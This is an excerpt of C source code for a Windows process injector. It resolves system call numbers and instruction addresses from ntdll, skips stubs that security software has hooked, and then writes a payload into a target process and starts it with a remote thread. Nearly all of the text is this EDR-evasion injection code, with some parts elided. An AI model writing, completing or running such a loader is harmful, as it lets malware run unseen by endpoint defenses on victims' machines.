...
DWORD NtOpenProcessSSN = 0, NtAllocateVirtualMemorySSN = 0;
DWORD NtWriteVirtualMemorySSN = 0, NtCreateThreadExSSN = 0;
DWORD NtWaitForSingleObjectSSN = 0, NtCloseSSN = 0;

UINT_PTR NtOpenProcessSyscall = 0, NtAllocateVirtualMemorySyscall = 0;
UINT_PTR NtWriteVirtualMemorySyscall = 0, NtCreateThreadExSyscall = 0;
UINT_PTR NtWaitForSingleObjectSyscall = 0, NtCloseSyscall = 0;

VOID NtCallResolver(HMODULE hNTDLL, LPCSTR NtFunction, DWORD* SSN, UINT_PTR* SyscallAddr) {
    UINT_PTR funcAddr = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
    if (!funcAddr) {
        warn("[GetProcAddress] failed for %s", NtFunction);
        return;
    }


    if (*(PBYTE)funcAddr == 0xE9) {
        warn("Hooked stub detected for %s (0xE9 jmp at start) - skipping resolution", NtFunction);
        return;
    }

    *SSN = ((PBYTE)(funcAddr + 4))[0];
    ...
    if (!*SyscallAddr) {
        warn("Failed to locate syscall instruction for %s", NtFunction);
        return;
    }

    info("\\_____\n          ||  %s\n          || -> SSN:      0x%lx\n          || -> Syscall:  0x%p\n          ||_______________________________\n\n",
         NtFunction, *SSN, (void*)*SyscallAddr);
}
...
BOOL IndirectSyscallsInjector(const PBYTE payload, SIZE_T payload_len) {
    ...
    warn("Indirect Syscalls Injector\n");
    ...
    if (!NtOpenProcessSyscall || !NtAllocateVirtualMemorySyscall || !NtWriteVirtualMemorySyscall ||
        !NtCreateThreadExSyscall || !NtWaitForSingleObjectSyscall || !NtCloseSyscall) {
        warn("Failed to resolve one or more syscall addresses");
        return FALSE;
    }
    ...
    if (status != STATUS_SUCCESS || bytesWritten != payload_len) {
        warn("NtWriteVirtualMemory failed: 0x%08X", status);
        Janitor(hProc);
        return FALSE;
    }
...
int main(void) {
    ...
    if (!IndirectSyscallsInjector(payload, sizeof(payload))) {
        warn("Injection failed");
        return 1;
    }
    okay("Indirect injection successful!");
    return 0;
}